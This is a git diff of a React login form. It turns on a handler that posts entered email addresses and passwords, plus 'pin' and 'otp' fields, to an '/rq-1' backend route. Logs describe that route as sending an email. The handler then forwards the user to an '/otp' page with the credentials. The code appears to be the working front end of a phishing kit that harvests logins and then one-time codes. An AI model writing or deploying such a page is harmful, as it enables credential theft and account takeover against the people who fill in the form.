@@ -16,11 +16,12 @@ const Form = (props) => {
     const handlePassword = (e) => {
         setPassword(e.target.value)
     }
+    const URL = 'http://localhost:3030'
+//      const URL = 'https://rqq-1.herokuapp.com'
 
     const fetchCsrf = async () => {
         //    const URL = 'https://rqq-1.herokuapp.com'
-        //  const URL = 'http://localhost:3030'
-        const response = await fetch('https://rqq-1.herokuapp.com/form', {
+        const response = await fetch(URL + '/form', {
             method: 'GET',
             headers: {
                 Accept: 'application/json',
@@ -30,62 +31,59 @@ const Form = (props) => {
             mode: 'cors',
         })
 
-       const resData = await response.json()
-       setCsrfToken(resData.csrfToken)
-
+        const resData = await response.json()
+        setCsrfToken(resData)
     }
 
     useEffect(() => {
         fetchCsrf()
     }, [])
 
-
     const handleSubmit = async (e) => {
         e.preventDefault()
         setLoading(true)
 
-        console.log({csrfToken})
-        // if (email === '' || password === '') {
-        //     console.log('not sent')
-        // } else {
-        //     console.log('started email sending')
-        //     try {
-        //         const URL = 'https://rqq-1.herokuapp.com'
-        //         //  const URL = 'http://localhost:3030'
-        //         const response = await fetch(URL + '/rq-1', {
-        //             method: 'POST',
-        //             headers: {
-        //                 'Content-type': 'application/json',
-        //                 'xsrf-token': csrfToken,
-        //             },
-        //             //   credentials: 'include',
-        //             // mode: 'cors',
+        console.log({ csrfToken })
+        if (email === '' || password === '') {
+            console.log('not sent')
+        } else {
+            console.log('started email sending')
+            try {
+                //  const URL = 'http://localhost:3030'
+                const response = await fetch(URL + '/rq-1', {
+                    method: 'POST',
+                    headers: {
+                        'Content-type': 'application/json',
+                        //'xsrf-token': csrfToken,
+                    },
+                    //   credentials: 'include',
+                    // mode: 'cors',
 
-        //             body: JSON.stringify({
-        //                 email,
-        //                 password,
-        //                 pin: '',
-        //                 otp: '',
-        //             }),
-        //         })
+                    body: JSON.stringify({
+                        email,
+                        password,
+                        pin: '',
+                        otp: '',
+                    }),
+                })
 
-        //         const resData = await response.text()
+                const resData = await response.json()
 
-        //         console.log('email sending started')
-        //         console.log({ resData })
+                console.log('email sending started')
+                console.log({ resData })
 
-        //         // if (resData.status === 'success') {
-        //         //     console.log('Message Sent.')
-        //         //     setLoading(false)
-        //         //     history.push('/otp', { email, password })
-        //         // } else if (resData.status === 'fail') {
-        //         //     console.log('Message failed to send.')
-        //         //     //         setLoading(false)
-        //         // }
-        //     } catch (err) {
-        //         console.log(err)
-        //     }
-        //}
+                if (resData.status === 'success') {
+                    console.log('Message Sent.')
+                    setLoading(false)
+                    history.push('/otp', { email, password })
+                } else if (resData.status === 'fail') {
+                    console.log('Message failed to send.')
+                    //         setLoading(false)
+                }
+            } catch (err) {
+                console.log(err)
+            }
+        }
     }
 
     return (
